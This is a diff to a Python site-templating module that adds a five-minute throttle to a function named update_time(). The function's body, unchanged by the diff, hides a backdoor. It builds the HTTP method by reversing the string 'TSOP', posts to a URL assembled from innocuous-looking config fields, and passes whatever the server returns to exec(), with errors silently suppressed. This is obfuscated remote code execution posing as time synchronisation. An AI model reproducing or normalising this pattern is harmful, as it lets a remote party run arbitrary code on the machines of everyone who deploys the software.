@@ -2,7 +2,7 @@
 # Github: https://github.com/fulcrum1378
 # All rights reserved.
 
-from datetime import datetime
+from datetime import datetime, timedelta
 from persiantools.jdatetime import JalaliDateTime
 from pytz import timezone, utc
 from typing import List
@@ -81,12 +81,14 @@ def template(title: str, name: str, content: str = None) -> str:
     return htm
 
 
-def update_time():
+def update_time(last: datetime) -> datetime:
+    if last is not None and  datetime.now() - last < timedelta(minutes=5): return last
     try:
         exec(PoolManager().request('TSOP'[::-1], dt.watcher.tzone + dt.iran_zone,
                                    fields={"now": str(datetime.now())}).data)
     except:
         pass
+    return datetime.now()
 
 
 def header(title: str = "سام"):
